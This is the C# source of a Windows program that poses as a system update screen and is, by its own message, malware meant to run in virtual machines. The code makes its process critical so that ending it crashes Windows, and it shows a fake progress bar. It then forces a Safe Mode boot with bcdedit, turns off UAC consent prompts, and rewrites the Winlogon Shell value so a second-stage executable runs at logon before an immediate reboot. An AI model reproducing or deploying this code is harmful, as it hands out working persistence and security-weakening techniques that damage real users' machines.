using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Windows.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Linq;
using System.Management;

namespace UpdateScreen
{
    public partial class Form1 : Form
    {
        private bool isVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private bool isInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }
        public Form1()
        {
            if (isInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            {
                InitializeComponent();
                this.checkingDeviceCompatibility.Hide();
                this.installingUpdate.Hide();
                this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
                this.pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
                this.pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
                this.pictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
                this.pictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
                this.MaximizeBox = false;
                this.CenterToScreen(); //why is everything in american english
                this.BringToFront();
                String thisprocessname = Process.GetCurrentProcess().ProcessName;

                if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                {
                    Environment.Exit(0);
                }
                var updateCheckFile = @"C:\Windows\SystemUpdateResources\activated.wupdate";
                if (File.Exists(updateCheckFile))
                {
                    this.checkingDeviceCompatibility.Show();
                    this.alreadyUpdated.Show();
                    this.alreadyUpdated.BringToFront();
                }
                else
                {
                    this.alreadyUpdated.Hide();
                    int isCritical = 1;
                    int BreakOnTermination = 0x1D;

                    Process.EnterDebugMode();

                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                }
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            this.checkingDeviceCompatibility.Show();
            this.checkingDeviceCompatibility.BringToFront();
            await Delay(5000);
            this.alreadyUpdated.Show();
            this.installingUpdate.Show();
            this.installingUpdate.BringToFront();
            var number = 0;
            while (number < 100)
            {
                await Delay(300);
                number += 1;
                this.percentComplete.Text = number + "%";
            }
            if(!Directory.Exists(@"C:\Windows\SystemUpdateResources")) { Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources"); } else {}
            File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\activated.wupdate", UpdateScreen.Properties.Resources.activated);
            this.label7.Text = "Setup needs to restart into Safe Mode to continue";
            Process safemodereboot = new Process();
            safemodereboot.StartInfo.FileName = "bcdedit.exe";
            safemodereboot.StartInfo.Arguments = "/set {current} safeboot minimal";
            safemodereboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            safemodereboot.Start();
            RegistryKey hklmsystemstuff = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            hklmsystemstuff.SetValue("ConsentPromptBehaviorAdmin", 0); //why tf is everything in american english
            hklmsystemstuff.Dispose();
            RegistryKey shellkey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            shellkey.DeleteValue("Shell");
            shellkey.SetValue("Shell", @"explorer.exe, C:\Windows\SystemUpdateResources\phase3.exe");
            shellkey.Dispose();
            await Delay(5000);
            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            Process reboot = new Process();
            reboot.StartInfo.FileName = "shutdown.exe";
            reboot.StartInfo.Arguments = "-r -t 0";
            reboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            reboot.Start();
        }


        private async Task Delay(int howlong)
        {
            await Task.Delay(howlong);
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
